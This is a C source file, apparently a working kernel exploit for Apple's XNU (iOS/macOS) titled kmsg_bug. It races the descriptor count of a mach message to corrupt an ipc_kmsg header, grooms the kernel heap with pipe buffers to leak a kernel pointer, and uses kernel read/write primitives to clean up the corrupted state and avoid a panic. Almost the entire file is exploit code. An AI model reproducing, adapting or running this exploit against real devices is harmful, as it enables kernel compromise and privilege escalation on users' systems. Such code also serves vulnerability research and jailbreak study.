//
//  exploit.c
//  kmsg_bug
//
//  Created by Jake James on 3/2/22.
//

#include <pthread/pthread.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <fcntl.h>

#include "desc_race.h"
#include "port_utils.h"
#include "spray.h"

#include "helper/offsets.h"
#include "helper/proc.h"
#include "kernel_rw.h"

// N_DESC = 14 and N_CORRUPTED = 1014 will make a message have 0x4000 size
// (there are other combinations however for some reason ones where difference is lower don't work?)
#define N_DESC 14
#define N_CORRUPTED 1014

// how many pipes to spray
#define N_SPRAY 1000

// size of each pipe buffer
#define KALLOC_SIZE 0x4000

// size of ool buffer
#define OOL_SIZE 0x100
#define BIG_BUFFER_SIZE 0x4000  //for default.kalloc.0x4000

volatile int keep_racing = 1;

typedef struct {
    mach_msg_bits_t       msgh_bits;
    mach_msg_size_t       msgh_size;
    uint64_t              msgh_remote_port;
    uint64_t              msgh_local_port;
    mach_port_name_t      msgh_voucher_port;
    mach_msg_id_t         msgh_id;
} kern_mach_msg_header_t;


struct ool_kmsg  {
    kern_mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_descriptor_t ool_messages[];
};

struct exp_msg {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports;
    mach_msg_ool_descriptor_t ool_desc[N_CORRUPTED - 1];
};

struct exp_msg msg;

void increase_file_limit() {
    struct rlimit rl = {};
    getrlimit(RLIMIT_NOFILE, &rl);
    rl.rlim_cur = 10240;
    rl.rlim_max = rl.rlim_cur;
    setrlimit(RLIMIT_NOFILE, &rl);
}

void set_nonblock(int fd) {
    int flags = fcntl(fd, F_GETFL);
    flags |= O_NONBLOCK;
    fcntl(fd, F_SETFL, flags);
}

void race_thread() {
    while (keep_racing) {
        // continue;
        // change the descriptor count back and forth
        // eventually the race will work just right so we get this order of actions:
        // count = N_DESC -> first copyin -> count = N_CORRUPTED -> second copyin
        msg.body.msgh_descriptor_count = N_CORRUPTED;
        msg.body.msgh_descriptor_count = N_DESC;
    }
    printf("[%s] terminated\n", __FUNCTION__);
}

int desc_race(uint64_t *default_kalloc_0x4000_kptr, mach_port_t *corrupted_ikm_port) {

    void *body = calloc(1, KALLOC_SIZE);
    
    // allow us to spray a lot of pipes
    increase_file_limit();

    // exploitation_init();    //XXX
    
    // ool buffer
    void* buf = calloc(1, OOL_SIZE * N_DESC);
    
    void *ports = calloc(1, BIG_BUFFER_SIZE/2); // size of a port in userland is half its size in kernel
    
    // set up the message
    msg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg.hdr.msgh_size = (mach_msg_size_t)(sizeof(struct exp_msg));
    msg.hdr.msgh_remote_port = 0;
    msg.hdr.msgh_local_port = MACH_PORT_NULL;
    msg.hdr.msgh_id = 0x12341234;
    
    // set the initial (smaller) descriptor count
    msg.body.msgh_descriptor_count = N_DESC;
    
    // ool ports descriptor
    msg.ool_ports.address = ports;
    msg.ool_ports.count = BIG_BUFFER_SIZE / 8;
    msg.ool_ports.deallocate = 0;
    msg.ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg.ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
    msg.ool_ports.disposition = MACH_MSG_TYPE_COPY_SEND;
    
    // ool descriptors
    for (int i = 0; i < N_DESC - 1; i++) {
        msg.ool_desc[i].address = buf + i * OOL_SIZE;
        msg.ool_desc[i].size = OOL_SIZE;
        msg.ool_desc[i].deallocate = 0;
        msg.ool_desc[i].type = MACH_MSG_OOL_DESCRIPTOR;
        msg.ool_desc[i].copy = MACH_MSG_PHYSICAL_COPY;
    }
    
    // original writeup uses a mach message for this, but we'd have to fix up the trailer to avoid breaking its signature, also pipes allow us to write back without reallocating
    printf("[%s] Spraying pipe buffers\n", __FUNCTION__);
    int pipes[N_SPRAY][2] = {0};

    for (int i = 0; i < N_SPRAY; i++) {
        int ret = pipe(pipes[i]);
        if (ret) {
            printf("[%s] Failed to create pipe: %s\n", __FUNCTION__, strerror(errno));
            continue;
        }
        
        set_nonblock(pipes[i][0]);
        set_nonblock(pipes[i][1]);
        memset(body, 0x71, KALLOC_SIZE);
        
        // -1 otherwise it'll make the size bigger
        ret = write(pipes[i][1], body, KALLOC_SIZE - 1);\
    }
    

    // -----------+-----------+-----------+------------+-----------
    //    pipe1   |   pipe2   |    ...    |  pipe5000  |
    // -----------+-----------+-----------+------------+-----------
    //
    
    // poke some holes to increase chance of landing right after a pipe
    printf("[%s] Poking holes\n", __FUNCTION__);
    fflush(stdout);
    for (int i = 0; i < N_SPRAY; i++) {
        if (i % 64 == 0) {
            close(pipes[i][0]);
            close(pipes[i][1]);
            pipes[i][0] = 0;
            pipes[i][1] = 0;
        }
    }
  
    // -----------+-----------+-----------+------------+------------+------------+-----------
    //    pipe1   |   pipe2   |    ...    |   pipe64   |    FREE    |   pipe67   |    ...
    // -----------+-----------+-----------+------------+------------+------------+-----------
    //
    printf("[%s] Racing\n", __FUNCTION__);
    
    // more reliability voodoo
    pthread_attr_t pattr;
    pthread_attr_init(&pattr);
    pthread_attr_set_qos_class_np(&pattr, QOS_CLASS_USER_INITIATED, 0);
    // start the threads
    pthread_t thread;
    pthread_create(&thread, &pattr, (void*)race_thread, NULL);

    // try up to 100000 times
    for (int i = 0; i < 100000; i++) {

        // create a mach port where we'll send the message
        mach_port_t dest = port_new();
    
        // send
        msg.hdr.msgh_remote_port = dest;
        int ret = mach_msg(&msg.hdr, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, msg.hdr.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if (ret) {
            printf("[%s] error: %s\n", __FUNCTION__, mach_error_string(ret)); while(1) {};
        }
    
        // hopefully (pre-trigger):
        // -----------+-----------+-----------+-----------+------------+-------------+-----------
        //    pipe1   |   pipe2   |    ...    |   pipeN   | ikm_header |   pipeN+2   |    ...
        // -----------+-----------+-----------+-----------+------------+-------------+-----------
        //
        
        // after bug trigger pipeN should overlap with ikm_header:
        
        //                                            +----------------+
        //                                            |                |
        // -----------+-----------+-----------+-----------+            +-------------+-----------
        //    pipe1   |   pipe2   |    ...    |   pipeN   | ikm_header |   pipeN+2   |    ...
        // -----------+-----------+-----------+-----------+------------+-------------+-----------
       
        
        // check if we overwrote one of the pipe buffers
        int opipe[2] = {0};
        for (int i = 0; i < N_SPRAY; i++) {
            if (pipes[i][0] && pipes[i][0] != opipe[0]) {;
                ssize_t ret = read(pipes[i][0], body, KALLOC_SIZE);
                if (ret == -1) {
                    printf("[%s] Failed to read pipe: %s\n", __FUNCTION__, strerror(errno));
                    continue;
                }
   
                // there seem to be some extra 56 bytes between the two
                int off = KALLOC_SIZE - 4 * (N_CORRUPTED - N_DESC) + 56;
                
                if (*(uint32_t*)(body + off) == 0x80000011) {
                    //terminate race thread
                    keep_racing = 0;
                    pthread_cancel(thread);
                    pthread_join(thread, NULL);

                    printf("[%s] Found ikm_header at pipe nr. %d\n", __FUNCTION__, i);
                    struct ool_kmsg *kmsg = body+off;
                     
                    uint64_t ool_ports_buffer = (uint64_t)kmsg->ool_messages[0].address;
                    
                    // assume this scenario is true and hope for the best
                    // IOSC_array = ool_ports_buffer - BIG_BUFFER_SIZE;
                    
                    // save the pipe
                    opipe[0] = pipes[i][0];
                    opipe[1] = pipes[i][1];
                    
                    pipes[i][0] = 0;
                    pipes[i][1] = 0;
                    
                    // close other pipes
                    for (int i = 0; i < N_SPRAY; i++) {
                        if (pipes[i][0]) close(pipes[i][0]);
                        if (pipes[i][1]) close(pipes[i][1]);
                    }
                    
                    printf("[%s] Leaked ool ports buffer: 0x%llx\n", __FUNCTION__, ool_ports_buffer);

                    // mach_port_destroy(mach_task_self(), dest);
                    *default_kalloc_0x4000_kptr = ool_ports_buffer;
                    *corrupted_ikm_port = dest;
                    return 0;
                }
                
                memset(body, 0, KALLOC_SIZE);
                write(pipes[i][1], body, KALLOC_SIZE - 1);
            }
        }
        
        // if bug didn't work, free message and try again
        // if bug worked but pipes weren't affected then we corrupted something else, let this just panic
        mach_port_destroy(mach_task_self(), dest);
    }
    
    printf("[%s] Failed to trigger vuln...\n", __FUNCTION__); while(1) {};
    return -1;
}

const uint32_t port_cnt = 0x100;
mach_port_t *kheap_default_ports_0x100;
int leak_default_kalloc_0x4000_kptr(uint64_t *default_kalloc_0x4000_kptr, mach_port_t *corrupted_ikm_port) {

    //spray default.kalloc.0x4000; about 0x100 times!
    mach_port_t *ool_ports = malloc(0x4000);
    mach_port_t *contained_ports = malloc(port_cnt * sizeof(mach_port_t));
    kheap_default_ports_0x100 = malloc(port_cnt * sizeof(mach_port_t));
    memset(ool_ports, 0, 0x4000);
    memset(kheap_default_ports_0x100, 0, port_cnt * sizeof(mach_port_t));
    memset(contained_ports, 0, port_cnt * sizeof(mach_port_t));

    for (int i = 0; i < port_cnt; ++i)
    {
        // KHEAP_DEFAULT
        *ool_ports = port_new();
        contained_ports[i] = *ool_ports;
        mach_port_t *pp = spray_default_kalloc_ool_ports(0x4000, 1, ool_ports);
        kheap_default_ports_0x100[i] = pp[0];
        free(pp);
    }

    //trigger vuln
    int ret = desc_race(default_kalloc_0x4000_kptr, corrupted_ikm_port);
    return ret;
}

uint64_t find_port(uint32_t port) {
    uint64_t task_addr = task_self_addr();
    uint64_t itk_space = kread64(task_addr + off_task_itk_space);
    uint64_t is_table = kread64(itk_space + off_ipc_space_is_table);

    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;

    uint64_t port_addr = kread64(is_table + (port_index * sizeof_ipc_entry_t));
    return port_addr;
}

int desc_race_cleanup(mach_port_t corrupted_ikm_port) {
    for (int i = 0; i < port_cnt; ++i)
    {
        port_destroy(kheap_default_ports_0x100[i]);
    }

    uint64_t port_kaddr = find_port(corrupted_ikm_port);
    uint32_t off_ipc_port_ikmq_base = 0x30;
    uint64_t ikmq_base = kread64(port_kaddr + off_ipc_port_ikmq_base);
    uint32_t off_ipc_kmsg_ikm_header = 0x18;    // p/x offsetof(struct ipc_kmsg, ikm_header)
    uint32_t off_ipc_kmsg_ikm_data = 0x10;      // p/x offsetof(struct ipc_kmsg, ikm_data)

    uint64_t ikm_header = kread64(ikmq_base+off_ipc_kmsg_ikm_header);
    printf("[%s] corrupted ikm_header is 0x%llx\n", __FUNCTION__, ikm_header); 
    uint64_t ikm_data = kread64(ikmq_base+off_ipc_kmsg_ikm_data);
    printf("[%s] ikm_header should be same with ikm_data = 0x%llx\n", __FUNCTION__, ikm_data);

    //restore kmsg's ikm_header and ikm_data
    uint64_t distance = ikm_data - ikm_header;
    kwrite64(ikmq_base+off_ipc_kmsg_ikm_header, ikm_data);

    uint32_t i = 0;
    for(uint64_t current = ikm_data; current < (ikm_data+distance); current+=8) {
        kwrite64(current, kread64(ikm_header+i*8));
        i++;
    }

    //should work! no more panic due to bound check in `ipc_kmsg_free`
    port_destroy(corrupted_ikm_port);

    return 0;
}